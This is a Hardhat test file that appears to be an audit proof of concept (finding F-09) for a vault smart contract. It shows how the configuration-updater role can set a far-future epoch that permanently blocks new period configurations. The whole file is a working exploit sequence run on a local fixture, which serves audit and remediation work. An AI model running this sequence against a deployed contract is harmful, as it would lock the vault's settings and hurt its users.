const { loadFixture, time } = require('@nomicfoundation/hardhat-network-helpers')
const { deployVault } = require('./setup/fixtures.js')
const { expect } = require('chai')

describe('POC F-09: addPeriodConfiguration no upper bound on epoch', function() {

  it('malicious operator locks vault period configuration forever', async () => {

    const { firelight_vault, period_configuration_updater } = await loadFixture(deployVault)

    // Step 1: Get current state
    const currentPC = await firelight_vault.currentPeriodConfiguration()
    console.log('Current epoch:', currentPC.epoch.toString())
    console.log('Current duration:', currentPC.duration.toString())

    // Step 2: Get next period end
    const nextEnd = await firelight_vault.nextPeriodEnd()
    console.log('Next period end:', nextEnd.toString())

    // Step 3: Malicious operator sets epoch to max uint48
    // This is year ~10,000 — effectively forever
    const MAX_UINT48 = 281474976710655n
    
    // Must be aligned with current duration
    const duration = currentPC.duration
    const epoch = currentPC.epoch
    
    // Find a valid far-future epoch that is aligned
    // newEpoch must satisfy: (newEpoch - epoch) % duration == 0
    // and newEpoch >= nextPeriodEnd
    const periodsAhead = (MAX_UINT48 - epoch) / duration
    const maliciousEpoch = epoch + (periodsAhead * duration)
    
    console.log('\nMalicious epoch being set:', maliciousEpoch.toString())
    console.log('This is year:', new Date(Number(maliciousEpoch) * 1000).getFullYear())

    // Step 4: Set the malicious far-future configuration
    await firelight_vault.connect(period_configuration_updater)
      .addPeriodConfiguration(maliciousEpoch, duration)
    console.log('\nMalicious period configuration added!')

    // Step 5: Now try to add another configuration
    // This should fail because the malicious config is now "last"
    // but it hasn't started yet (it's in year 10,000)
    // So currentPeriodConfiguration() returns the OLD config
    // but periodConfigurations[last] is the malicious one
    // → CurrentPeriodConfigurationNotLast revert!

    const anotherEpoch = nextEnd + duration
    
    await expect(
      firelight_vault.connect(period_configuration_updater)
        .addPeriodConfiguration(anotherEpoch, duration)
    ).to.be.revertedWithCustomError(firelight_vault, 'CurrentPeriodConfigurationNotLast')

    console.log('CONFIRMED: Cannot add any more period configurations!')
    console.log('Vault period settings are PERMANENTLY LOCKED until year 10,000')
    console.log('No admin action can fix this without a contract upgrade')

  })
})
